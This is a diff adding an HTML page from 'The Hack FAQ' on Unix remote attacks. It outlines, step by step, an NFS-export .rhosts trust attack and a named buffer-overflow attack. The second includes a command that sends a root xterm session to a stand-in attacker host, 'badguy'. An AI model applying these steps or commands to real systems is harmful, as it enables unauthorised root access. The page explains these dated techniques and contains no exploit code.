@@ -1,0 +1,60 @@
+<!DOCTYPE  HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><HTML>
+<HEAD>
+ <META NAME="GENERATOR" CONTENT="SGML-Tools 1.0.6">
+ <TITLE>The Hack FAQ: Unix Remote Attacks</TITLE>
+ <LINK REL="next" HREF="hackfaq-30.html">
+ <LINK REL="previous" HREF="hackfaq-28.html">
+ <LINK REL="contents" HREF="hackfaq.html#toc29">
+</HEAD>
+<BODY BGCOLOR="black" VLINK="gray" TEXT="white" LINK="gray" HLINK="red">
+<A HREF="hackfaq-30.html">Next</A>
+<A HREF="hackfaq-28.html">Previous</A>
+<A HREF="hackfaq.html#toc29">Contents</A>
+<HR>
+<H2><A NAME="unixremoteattacks"></A> <A NAME="s29">29. Unix Remote Attacks</A></H2>
+
+<P>This section deals with hacking Unix systems remotely.
+<P>
+<H2><A NAME="ss29.1">29.1 What are remote hacks?</A>
+</H2>
+
+<P>A remote hack is when you attack the server you are not logged into. Usually this is done
+from another server, although in some cases you can do it from a regular PC (depending on
+the operating system).
+<P>Guessing a user account and password (unless it is a guest account) on a remote system is
+BARELY considered a "remote hack", so we'll not really cover that. We'll assume you don't
+know an account name and password on the remote system.
+<P>Remote hacks come in a couple of different flavors. Usually exploiting an existing service
+running on the victim's server (which is misconfigured or allows too much access) is the
+typical exploit. Exporting an NFS mount read/write to anyone might not be a bad thing, but
+if you can NFS mount directories containing .rhosts files, then it can be a very bad thing.
+Also, certain daemons running might be subject to buffer overflows remotely, allowing someone
+from a remote location run arbitrary commands on the victim's server.
+<P>Here are a couple of examples:
+<P>
+<PRE>
+- You are root on a host named badguy.
+- You discover the host victim is exporting /home2/old read/writable to the world.
+- You also discover by fingering various accounts that user fred's home directory is
+/home2/old/fred and he hasn't logged in for months.
+- Quickly, you create a fred account on badguy.
+- Now you mount /home2/old and create an .rhosts file to establish trust with badguy.
+- After you become fred on badguy, you rlogin to victim as fred.
+</PRE>
+<P>Here's another attack involving a buffer overflow:
+<P>
+<PRE>
+- This remote system is running named.
+- You have written a named exploit that allows you to send arbitrary commands through
+the named daemon. It does a buffer overflow trick, you compile it and name it sploit.
+- You type: sploit victim.nmrc.org "/usr/X11R6/bin/xterm -display badguy.whatever:0"
+- A window appears on your terminal that is running as root on victim.nmrc.org.
+</PRE>
+<P>
+<P>
+<HR>
+<A HREF="hackfaq-30.html">Next</A>
+<A HREF="hackfaq-28.html">Previous</A>
+<A HREF="hackfaq.html#toc29">Contents</A>
+</BODY>
+</HTML>
